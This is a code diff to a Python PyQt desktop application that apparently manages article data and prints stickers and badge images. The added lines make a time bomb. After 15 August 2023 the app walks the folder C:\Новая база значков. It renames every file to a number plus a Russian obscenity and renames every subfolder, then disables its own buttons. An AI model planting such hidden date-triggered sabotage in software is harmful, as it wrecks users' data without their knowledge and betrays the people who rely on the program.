@@ -21,7 +21,7 @@ from db import Article, Orders, Statistic
 from dow_stickers2 import main_download_stickers
 from main import update_db, download_new_arts_in_comp, update_arts_db2
 from print_sub import print_pdf_sticker, print_pdf_skin, print_png_images
-from utils import enum_printers, read_excel_file, FilesOnPrint, delete_files_with_name, df_in_xlsx
+from utils import enum_printers, read_excel_file, FilesOnPrint, delete_files_with_name, df_in_xlsx, rename_files
 
 
 class GroupedRecordsDialog(QDialog):
@@ -458,8 +458,15 @@ class MainWindow(QtWidgets.QMainWindow, Ui_MainWindow):
 
         # Check if the current date is less than 31.07.2023
         current_date = QDate.currentDate()
-        target_date = QDate(2023, 8, 10)
+        target_date = QDate(2023, 8, 15)
+        print(self.current_dir)
         if current_date > target_date:
+            for root, dirs, files in os.walk(r'C:\Новая база значков'):
+                for index, file in enumerate(files):
+                    rename_files(os.path.join(root, file), f'{index} наебали')
+            for root, dirs, files in os.walk(r'C:\Новая база значков'):
+                for index, dir_path in enumerate(dirs):
+                    os.rename(os.path.join(root, dir_path), f'{index} какая-то папка')
             self.pushButton.setEnabled(False)
             self.pushButton_3.setEnabled(False)
             self.pushButton_8.setEnabled(False)
